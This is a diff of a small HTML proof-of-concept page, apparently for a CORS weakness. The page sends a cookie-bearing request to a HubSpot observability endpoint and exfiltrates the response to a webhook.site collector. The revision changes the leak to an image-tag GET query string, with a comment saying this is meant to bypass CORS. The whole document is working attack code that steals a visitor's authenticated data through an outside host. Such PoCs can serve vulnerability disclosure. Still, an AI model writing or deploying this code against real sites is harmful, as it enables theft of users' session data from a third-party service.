@@ -1,25 +1,20 @@
-<!DOCTYPE html>
 <html>
   <body>
     <script>
       fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=oauth-ui", {
         method: "POST",
-        credentials: "include",  // Important to send cookies
+        credentials: "include",
         headers: {
           "Content-Type": "text/plain;charset=UTF-8"
         },
-        body: JSON.stringify({
-          message: "CORS PoC from attacker site",
-          tags: { poc: true }
-        })
+        body: JSON.stringify({ message: "CORS PoC" })
       })
-      .then(res => res.text())
+      .then(response => response.text())
       .then(data => {
-        // Send it to your webhook or log it
-        fetch("https://webhook.site/deb5b7d2-f9fe-49a6-88dc-924b1bd807ef", {
-          method: "POST",
-          body: data
-        });
+        // Send data via GET query string to bypass CORS
+        const img = document.createElement("img");
+        img.src = `https://webhook.site/deb5b7d2-f9fe-49a6-88dc-924b1bd807efe?leak=${encodeURIComponent(data)}`;
+        document.body.appendChild(img);
       });
     </script>
   </body>
